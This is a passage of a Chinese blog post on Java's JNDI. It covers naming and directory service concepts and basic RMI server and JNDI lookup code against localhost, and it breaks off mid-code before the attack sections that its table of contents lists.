<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Java基础之JNDI">
<title>JNDI</title>

<link rel='canonical' href='https://fupanc-w1n.github.io/p/jndi/'>

<link rel="stylesheet" href="/scss/style.min.45e3de8c0814070cbaa5e985ce54bc3660dbcbfa7077926b65bdd229ae300803.css"><meta property='og:title' content="JNDI">
<meta property='og:description' content="Java基础之JNDI">
<meta property='og:url' content='https://fupanc-w1n.github.io/p/jndi/'>
<meta property='og:site_name' content='fupanc'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-10-22T22:54:06&#43;08:00'/><meta property='article:modified_time' content='2024-10-22T22:54:06&#43;08:00'/>
<meta name="twitter:title" content="JNDI">
<meta name="twitter:description" content="Java基础之JNDI">
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/123_hu_e29e335f2b79de0d.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">🔋</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">fupanc</a></h1>
            <h2 class="site-description">我与我周旋久，宁做我</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/fupanc-w1n'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>主页</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>关于</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>暗色模式</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">目录</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#概述">概述</a>
      <ol>
        <li><a href="#命名服务目录服务">命名服务/目录服务</a>
          <ol>
            <li><a href="#重点说明">重点说明</a></li>
          </ol>
        </li>
        <li><a href="#jndi架构简单学习">JNDI架构简单学习</a></li>
        <li><a href="#jndi-协议转换">JNDI-协议转换</a></li>
      </ol>
    </li>
    <li><a href="#jndi的接口实现">JNDI的接口实现</a>
      <ol>
        <li><a href="#jndi-rmi服务">JNDI-RMI服务</a>
          <ol>
            <li><a href="#基本代码">基本代码</a></li>
            <li><a href="#源码分析">源码分析</a></li>
            <li><a href="#补充说明">补充说明</a></li>
          </ol>
        </li>
        <li><a href="#jndi-dns服务">JNDI-DNS服务</a>
          <ol>
            <li><a href="#基本代码-1">基本代码</a></li>
            <li><a href="#源码分析-1">源码分析</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#jndi攻击">JNDI攻击</a>
      <ol>
        <li><a href="#前置知识了解">前置知识了解</a>
          <ol>
            <li><a href="#reference类了解">Reference类了解</a></li>
            <li><a href="#远程对象引用安全限制">远程对象引用安全限制</a></li>
          </ol>
        </li>
        <li><a href="#jndi-rmi注入">JNDI-RMI注入</a>
          <ol>
            <li><a href="#示例代码">示例代码</a></li>
            <li><a href="#代码调试">代码调试</a></li>
          </ol>
        </li>
        <li><a href="#jndi-ldap注入">JNDI-Ldap注入</a>
          <ol>
            <li><a href="#基本代码-2">基本代码</a></li>
            <li><a href="#代码调试-1">代码调试</a></li>
          </ol>
        </li>
        <li><a href="#注意事项">注意事项</a></li>
        <li><a href="#高版本限制绕过">高版本限制绕过</a>
          <ol>
            <li><a href="#利用本地class作为reference-factory">利用本地Class作为Reference Factory</a></li>
            <li><a href="#利用ldap返回序列化数据反序触发本地gadget">利用LDAP返回序列化数据，反序触发本地Gadget</a></li>
          </ol>
        </li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/java%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
                Java安全
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/jndi/">JNDI</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            Java基础之JNDI
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2024-10-22</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    阅读时长: 10 分钟
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="jndi">JNDI
</h1><h2 id="概述">概述
</h2><p>Java Naming Directory Interface，Java命名和目录接口，是SUN公司提供的一种标准的Java命名系统接口。</p>
<p>通过调用JNDI的API应用程序可以定位资源和其他程序对象。</p>
<p>JNDI可访问的现有目录及服务包括：JDBC（Java数据库连接）、LDAP（轻型目录访问协议）、RMI（远程方法调用）、DNS（域名服务）、NID（网络信息服务）、CORBA（公告对象请求代码系统结构）等。</p>
<h3 id="命名服务目录服务">命名服务/目录服务
</h3><p>前面提到有命名服务/目录服务，简单了解一下</p>
<p>JNDI包括命名服务（Naming Service）和目录服务（Directory Serrvice）。</p>
<ul>
<li>
<p><strong>命名服务</strong>：一种通过名称来查找实际对象的服务。例如RMI中,Naming.lookup方法通过查找名称来获取远程对象的代理类。</p>
<p>相关概念：</p>
<ul>
<li>Name：名称。要在命名系统中查找对象，需要提供对象的名称</li>
<li>Naming Convention：命名规范。一个命名系统中的所有名称必须遵循的语法规范</li>
<li>Binding：绑定。一个名称和一个对象的关联</li>
<li><strong>Reference：引用。一些命名服务系统不是直接存储对象，而是保存对象的引用。引用包含了如何访问实际对象的信息。</strong></li>
<li>Address：地址。引用通常用一个或多个地址（通信端口）来表示</li>
<li>Context：上下文。一个上下文是一系列名称和对象的绑定的集合。<strong>一个上下文中的名称可以绑定到一个具有相同命名规范的上下文中</strong>，成为子上下文（subcontext）。例如：在文件系统中，/usr是一个Context，/usr/bin是usr的subcontext。</li>
<li>Naming System：命名系统。一个相同类型的上下文集合</li>
<li>Namespace：命名空间。一个命名系统的所有名称的集合</li>
<li>Atomic Name：原子名。一个简单基本结构</li>
<li>Compound Name：混合名。由多个原子名一起构成的名称</li>
<li>Composite Name：复合名称。是跨越多个命名系统的名称</li>
</ul>
</li>
<li>
<p><strong>目录服务</strong>：是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性。目录服务中的对象称之为目录对象，目录对象可以跟属性关联，一个目录是由相关联的目录对象组成的系统。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。</p>
<p>相关概念：</p>
<ul>
<li>Attribute：属性。一个目录对象可以包含属性。一个属性具有一个属性标识符和一系列属性值。</li>
<li>Search Filter：查找过滤器。通常还提供通过目录对象的属性来查找对象的操作。</li>
</ul>
</li>
</ul>
<h4 id="重点说明">重点说明
</h4><p>还有几个点需要说明一下，</p>
<p>前面概念中重点标注出来的几个点，现在再稍微说明一下：</p>
<ul>
<li>
<p>Reference引用，重点就是上面标注出来的说明。</p>
</li>
<li>
<p>Context（上下文）：所谓上下文，是你当前执行程序的一个环境，存储了系统的一些初始化信息。</p>
</li>
</ul>
<p>就比如学习Tomcat内存马时，提到的一个StandardContext对象，当时就是为了通过这个对象来获取到当前应用的信息，即这对象可以看作当前web程序的“资源”。</p>
<p><strong>JNDI也一样，提供了InitialContext对象来为我们获取命名服务资源，提供InitialDirContext对象来为我们获取目录服务资源</strong>。</p>
<p>还有一个Context类：</p>
<ul>
<li>Context接口：命名服务在初始化上下文中，我们就用到了Context接口中定义的变量，分别用到了<code>INITIAL_CONTEXT_FACTORY</code>和<code>PROVIDER_URL</code>。</li>
</ul>
<p><code>INITIAL_CONTEXT_FACTORY</code>：保存环境属性名称的常量，用于指定要使用的初始上下文工厂。该属性的值应该是将创建初始上下文的工厂类完全限定类名。</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410071959692.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241007195933460"
	
	
></p>
<p><code>PROVIDER_URL</code>：保存环境属性名称的常量，用于指定服务提供者要使用的配置信息。该属性的值应包含一个URL字符串。</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410072001040.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241007200105905"
	
	
></p>
<h3 id="jndi架构简单学习">JNDI架构简单学习
</h3><p>JNDI架构提供了一个标准的、与命名系统无关的API，这个API构建在特定于命名系统的驱动程序之上。这一层有助于把应用程序和实际的数据源隔离开来，因此无论应用程序是访问LDAP、RMI、DNS还是其他的目录服务，这都没有关系。换句话说，JNDI与任何特定的目录服务实现无关，您可以使用任何目录，只要您拥有相应的服务提供程序接口（或驱动程序）即可，如下图所示：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410081258992.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241008125836693"
	
	
></p>
<p>其实就是在RMI等服务外面再套了一层API，方便调用。</p>
<h3 id="jndi-协议转换">JNDI-协议转换
</h3><p>如果<code>JNDI</code>在<code>lookup</code>时没有指定初始化工厂名称，会自动根据协议类型动态查找内置的工厂类然后创还能处理对象的服务请求。</p>
<p>JNDI默认支持自动转换的协议有：</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>协议名称</th>
          <th>协议URL</th>
          <th>Context类</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>DNS协议</td>
          <td>dns://</td>
          <td>com.sun.jndi.url.dns.dnsURLContext</td>
      </tr>
      <tr>
          <td>RMI协议</td>
          <td>rmi://</td>
          <td>com.sun.jndi.url.rmi.rmiURLContext</td>
      </tr>
      <tr>
          <td>LDAP协议</td>
          <td>ldap://</td>
          <td>com.sun.jndi.url.ldap.ldapURLContext</td>
      </tr>
      <tr>
          <td>LDAP协议</td>
          <td>ldaps://</td>
          <td>com.sun.jndi.url.ldaps.ldapsURLContextFactory</td>
      </tr>
      <tr>
          <td>IIOP对象请求代理协议</td>
          <td>iiop://</td>
          <td>com.sun.jndi.url.iiop.iiopURLContext</td>
      </tr>
      <tr>
          <td>IIOP对象请求代理协议</td>
          <td>iiopname://</td>
          <td>com.sun.jndi.url.iiopname.iiopnameURLContextFactory</td>
      </tr>
      <tr>
          <td>IIOP对象请求代理协议</td>
          <td>corbaname://</td>
          <td>com.sun.jndi.url.corbaname.corbanameURLContextFactory</td>
      </tr>
  </tbody>
</table></div>
<p>以后面的RMI代码片段为例：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 创建JNDI目录服务上下文</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">InitialContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InitialContext</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// 查找JNDI目录服务绑定的对象</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">RemoteInterface</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">RemoteInterface</span><span class="p">)</span><span class="n">context</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="s">&#34;rmi://127.0.0.1:1099/Hello&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">o</span><span class="p">.</span><span class="na">sayHello</span><span class="p">());</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>这里也会可以成功调用一个sayHello()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410101814251.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010181442163"
	
	
></p>
<p>本来lookup这里只需要传参“Hello&quot;即可，但是就需要进行环境配置，这样传入也能正常获取代理对象并调用方法，这得益于这里的lookup()会动态地识别用户要调用的服务以及路径，然后就会自动使用rmiURLContext处理RMI请求，也是在jndi注入中比较常用的一点。</p>
<h2 id="jndi的接口实现">JNDI的接口实现
</h2><p>测试环境：</p>
<ul>
<li>JDK 8u71</li>
</ul>
<h3 id="jndi-rmi服务">JNDI-RMI服务
</h3><p><code>RMI</code>的服务处理工厂类是：<code>com.sun.jndi.rmi.registry.RegistryContextFactory</code>，在调用远程的<code>RMI</code>方法之前需要先启动<code>RMI</code>服务，然后就可以使用<code>JNDI</code>来连接并调用了。</p>
<h4 id="基本代码">基本代码
</h4><p>先开启一个RMI服务，直接用之前的代码即可：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">Rmi.Server</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.Naming</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RMIServer</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//创建注册中心</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">createRegistry</span><span class="p">(</span><span class="n">1099</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Server start&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//绑定调用类</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">RemoteInterface</span><span class="w"> </span><span class="n">remoteTest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RemoteTest</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Naming</span><span class="p">.</span><span class="na">bind</span><span class="p">(</span><span class="s">&#34;rmi://localhost:1099/Hello&#34;</span><span class="p">,</span><span class="n">remoteTest</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>在访问JNDI目录服务时会通过预先设置好环境变量访问对应的服务：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Hashtable</span><span class="w"> </span><span class="n">env</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Hashtable</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">env</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">Context</span><span class="p">.</span><span class="na">INITIAL_CONTEXT_FACTORY</span><span class="p">,</span><span class="s">&#34;com.sun.jndi.rmi.registry.RegistryContextFactory&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">env</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">Context</span><span class="p">.</span><span class="na">PROVIDER_URL</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;rmi://localhost:1099&#34;</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>简单理解就是通过Context.INITIAL_CONTEXT_FACTORY告诉JNDI我要访问何种服务，通过Context.PROVIDER_URL告诉JNDI所要访问服务的路径。</p>
<p>然后就是初始化上下文，传入我们设置好的环境变量：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Context</span><span class="w"> </span><span class="n">initialContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InitialContext</span><span class="p">(</span><span class="n">env</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>还有另外一种类似的获取上下文的操作</strong>，即不指定环境变量，那么JNDI会自动搜索系统属性System.getProperty()、applet参数和应用程序资源文件jndi.properties，所以我们也可以通过System.setProperty()设置环境变量：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">System</span><span class="p">.</span><span class="na">setProperty</span><span class="p">(</span><span class="n">Context</span><span class="p">.</span><span class="na">INITIAL_CONTEXT_FACTORY</span><span class="p">,</span><span class="s">&#34;com.sun.jndi.rmi.registry.RegistryContextFactory&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">System</span><span class="p">.</span><span class="na">setProperty</span><span class="p">(</span><span class="n">Context</span><span class="p">.</span><span class="na">PROVIDER_URL</span><span class="p">,</span><span class="s">&#34;rmi://localhost:1099&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">InitialContext</span><span class="w"> </span><span class="n">initialContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InitialContext</span><span class="p">();</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>然后利用提供的lookup()方法，通过查询名字获取远程对象代理类：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//获取远程代理类</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">RemoteInterface</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">RemoteInterface</span><span class="p">)</span><span class="w"> </span><span class="n">initialContext</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="s">&#34;Hello&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//调用远程对象的方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">o</span><span class="p">.</span><span class="na">sayHello</span><span class="p">());</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>所以完整代码如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">JNDI</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Hashtable</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.Context</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">Rmi.Server.RemoteInterface</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.InitialContext</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
